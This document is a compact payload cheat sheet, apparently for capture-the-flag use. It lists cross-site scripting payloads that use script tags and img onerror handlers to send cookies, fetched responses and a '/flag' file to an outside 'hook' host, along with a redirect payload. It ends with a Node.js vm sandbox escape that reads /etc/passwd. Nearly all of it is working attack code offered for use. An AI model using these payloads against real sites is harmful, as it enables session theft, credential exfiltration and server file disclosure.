### Open connection

- **GET**
  - `<script>fetch('http://hook')</script>`

- **POST**
  - `<script>fetch('http://hook',{method:'POST'})</script>`

- **Open and redirect**
  - `<script>fetch("https://localhost").then((response) => response.json()).then((data) => fetch("https://hook/?/=".concat(JSON.stringify(data)),{credentials:'include'}));</script>`

### Cookie

- **XmlHttpRequest**
  - `<script>var a=new XmlHttpRequest();a.open("GET","https://hook",true);a.withCredentials=true;a.send(null);</script>`

- **Element**
  - `<script>var i=new Image;i.src="https://hook/?"+document.cookie;</script>`
  - `<script>var i=new Image();i.src="https://hook?cookie="+btoa(document.cookie);</script>`
  - `<img src=x onerror="javascript:document.location='https://hook?cookie='+document.cookie;">`
  - `<img src=x onerror="this.src='https://hook/?'+document.cookie;this.removeAttribute('onerror');">`
  - `"'&<></h1><script>fetch('/flag').then(r=>{r.text().then(t=>fetch('https://hook/?flag='+btoa(t),{'mode':'no-cors'}))})</script><h1></h1>`
 
### Redirect

- **Window**
  - `<script>window.location.replace("https://hook");</script>`

### VM

```javascript
const vm = require('vm');
const result = vm.runInNewContext(`
  (function() {
    var c = 'constructor';
    var require = require=this[c][c]('return process')().mainModule.require;
    var fs = require('fs');
    return String(fs.readFileSync('/etc/passwd'));
  })()
`);

console.log(result);
```

